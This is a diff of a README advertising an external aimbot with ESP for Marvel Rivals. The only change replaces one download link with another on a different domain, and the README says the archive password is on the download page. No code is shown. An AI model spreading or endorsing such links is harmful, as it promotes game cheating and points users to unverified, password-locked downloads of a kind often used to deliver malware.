@@ -18,7 +18,7 @@ Marvel Rivals external aimbot — hero-specific targeting, smooth aim, and ESP.
 
 ## Download
 
-[![Download v2026.6](https://img.shields.io/badge/Download_v2026.6-ec4899?style=for-the-badge&logoColor=white)](https://forumconnect.uk/mrvaimbot)
+[![Download v2026.6](https://img.shields.io/badge/Download_v2026.6-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/mrvaimbot)
 
 > The archive password is shown on the download page.
 
